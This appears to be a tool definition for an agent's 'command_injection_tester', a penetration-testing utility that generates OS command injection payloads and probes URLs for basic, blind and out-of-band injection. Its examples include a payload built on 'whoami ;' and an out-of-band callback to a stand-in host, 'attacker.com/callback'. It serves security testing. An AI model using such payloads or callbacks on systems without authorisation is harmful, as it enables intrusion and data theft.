tool.name: command_injection_tester
tool.description: Test for OS command injection vulnerabilities in web applications.
tool.details: Common Use Cases: - Test basic command injection with output reflection - Test blind command injection using timing attacks - Generate command injection payloads - Test specific endpoints for command injection - Out-of-band (OOB) verification for blind injection

parameter.name: action
parameter.description: The testing action to perform: - test_basic: Test basic command injection with output - test_blind: Test blind injection using timing - generate_payload: Generate command injection payloads - test_endpoint: Test specific endpoint with payload

parameter.name: url
parameter.description: Target URL for testing. Required for test_basic, test_blind, test_endpoint actions.

parameter.name: os_type
parameter.description: Operating system type: linux or windows (default: linux)

returns.description: Test results including vulnerability detection and payload effectiveness

tool.examples:
# Test basic command injection
test_basic https://example.com/exec cmd
# Test blind command injection
test_blind https://example.com/exec linux
# Generate payloads
generate_payload whoami ;
# Test endpoint with OOB callback
generate_payload id https://attacker.com/callback
